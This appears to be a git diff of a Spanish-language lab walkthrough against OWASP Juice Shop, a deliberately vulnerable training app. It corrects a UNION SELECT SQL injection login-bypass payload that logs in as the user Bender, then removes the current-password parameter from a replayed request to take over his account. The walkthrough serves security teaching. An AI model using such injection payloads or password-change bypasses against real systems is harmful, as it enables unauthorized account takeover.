@@ -87,24 +87,29 @@ La razón por la cual ha funcionado este hack es obvia. El codigo fuente de la a
 IMPORTANTE!!!
 Para futuros laboratorios, te recomiendo que vuelvas a poner el password que tenía tu usuario de la aplicación. Así que esta vez cámbialo de la forma habitual sin modificar la request.
 
-Recordemos que el objetivo fundamental de este ejercicio consistía en cambiarle el password a un usuario llamado ***Blender*** sin conocer su password actual. Para conseguirlo necesitamos que la aplicación nos autentique como dicho usuario.
+Recordemos que el objetivo fundamental de este ejercicio consistía en cambiarle el password a un usuario llamado ***Bender*** sin conocer su password actual. Para conseguirlo necesitamos que la aplicación nos autentique como dicho usuario.
 
-El ***Ejercicio 3*** del ***lab-25-D*** permitió exfiltrar todos los usuarios de la base de datos. De esta forma podemos saber que el ***email*** del usuario ***Blender*** es 
+El ***Ejercicio 3*** del ***lab-25-D*** permitió exfiltrar todos los usuarios de la base de datos. De esta forma podemos saber que el ***email*** del usuario ***Bender*** es.
 ```
 bender@juice-sh.op
 ```
 
+Y su ***id*** es.
+```
+3
+```
+
 En el ***Ejercicio 5*** del ***lab-25-D*** aprendimos a obtener un bearer token para cualquier usuario y, de esta forma, estar autenticados para la aplicación.
 
-En consecuencia usaremos estas dos técnicas junto a la debilidad que hemos encontrado en este ejercicio para cambiar la contraseña del usuario ***Belnder*** y en consecuencia quedarnos con su cuenta.
+En consecuencia usaremos estas dos técnicas junto a la debilidad que hemos encontrado en este ejercicio para cambiar la contraseña del usuario ***Bender*** y quedarnos con su cuenta.
 
 Volvemos a la página de login de la aplicación, y en el campo ***email*** pegamos el siguiente texto.
-(Nota: Observa como hemos puesto el email del usuario Blender. Como password pueder poner el que quieras)
+(Nota: Observa cómo hemos puesto el ***id*** y ***email*** del usuario Bender. Como password pueder poner el que quieras)
 ```
-' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'blender@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+' UNION SELECT * FROM (SELECT 3 as 'id', '' as 'username', 'bender@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
 ```
 
-Ya estamos logados como Blender. 
+Ya estamos logados como Bender. 
 
 ![login](../img/lab-25-E/202211261124.png)
 
@@ -125,9 +130,20 @@ y en ***Repeat New Password*** ponemos.
 NUEVO_PASSWORD
 ```
 
-En el historial de ZAP, capturamos la request, la editamos y eliminamos el parámetro ***current***. Hacemos clic en ***Replay in Console*** y ya habremos cambiado el password de Blender.
+En el historial de ZAP, capturamos la request, la editamos y eliminamos el parámetro ***current***. Hacemos clic en ***Replay in Console*** y ya habremos cambiado el password de Bender.
 
-Puedes cerrar sesión y probar a inicarla con el nuevo password. La cuenta de Blender ya es tuya.
+Puedes cerrar sesión y probar a inicarla con las siguientes credenciales. La cuenta de Bender ya es tuya.
+
+Usuario.
+```
+bender@juice-sh.op
+```
+
+Password.
+```
+NUEVO_PASSWORD
+```
+
 
 
 ***FIN DEL LABORATORIO***
